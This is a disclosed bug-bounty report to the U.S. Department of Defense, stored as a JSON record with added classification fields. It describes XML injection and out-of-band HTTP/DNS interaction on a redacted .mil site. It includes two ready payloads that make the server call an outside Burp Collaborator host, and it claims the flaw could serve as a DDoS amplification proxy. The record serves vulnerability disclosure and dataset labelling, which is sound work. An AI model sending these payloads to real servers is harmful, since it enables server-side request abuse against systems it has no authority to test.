{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "fiveguyslover ",
    "title": "XML Injection / External Service Interaction (HTTP/DNS) On https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil",
    "content": "\nGreetings, I found on one of your sites an XML Injection + External service Interaction (DNS/HTTP)\nLink of the vulnerable file : https://\u2588\u2588\u2588\u2588\u2588.mil/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPayload XML Injection :\nCode 184 Bytes\n1<fkpxmlns=\"http://a.b/\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xsi:schemaLocation=\"http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd\">fkp</fkp>\n(please change the link of burp collaborator and + URL encode the payload)\nHow to reproduce\n\u2588\u2588\u2588\u2588\u2588\n(I cut the video because the reception time is 30-40 seconds, it is not very relevant)\nhere is another payload that works, without XML :\nCode 79 Bytes\n1http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg\n(please change the link of burp collaborator)\nit is also necessary to wait a little, possibly one minute.\nall the ips I receive are from \u2588\u2588\u2588.\nif you need help, don't hesitate.\nfiveguyslover.\nImpact\nXML Injection + We can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nLink of the vulnerable file : https://\u2588\u2588\u2588\u2588\u2588\u2588.mil/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPayload XML Injection :\nCode 184 Bytes\n1<fkpxmlns=\"http://a.b/\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xsi:schemaLocation=\"http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd\">fkp</fkp>\n(please change the link of burp collaborator and + URL encode the payload)\nhere is another payload that works, without XML :\nCode 79 Bytes\n1http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg\nPOC Attached\nSuggested Mitigation/Remediation Actions\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "XML Injection"
    ],
    "screenshots": {},
    "disclosed_date": 1623799800,
    "report_url": "https://hackerone.com/reports/1150799",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Send a crafted XML payload to the vulnerable endpoint: https://\u2588\u2588\u2588\u2588\u2588.mil/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 with an external DNS/HTTP reference to a Burp Collaborator instance."
        ],
        [
            2,
            "Alternatively, send a simple HTTP request to the vulnerable endpoint with a Burp Collaborator URL as a parameter."
        ]
    ],
    "vuln_description": "The vulnerability involves XML Injection and External Service Interaction (HTTP/DNS) on a .mil domain. By injecting malicious XML or HTTP payloads, an attacker can force the server to interact with external services, potentially leading to data exfiltration, SSRF, or amplification attacks.",
    "reason": "The vulnerability requires crafting specific payloads (XML or HTTP) and understanding how the server processes external references. However, the attack vectors are straightforward once the payload format is known, and the interaction logic is not particularly subtle or complex.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "reason": "The vulnerability involves XML Injection and External Service Interaction (HTTP/DNS), which is not related to authentication or authorization bypass. The methodology described focuses on detecting IDOR and AuthN/AuthZ bypass vulnerabilities by manipulating user sessions, actions, and resource IDs within the same application. Since the reported issue does not involve these mechanisms, it would not be detectable using the described methodology.",
        "is_detectable": false
    }
}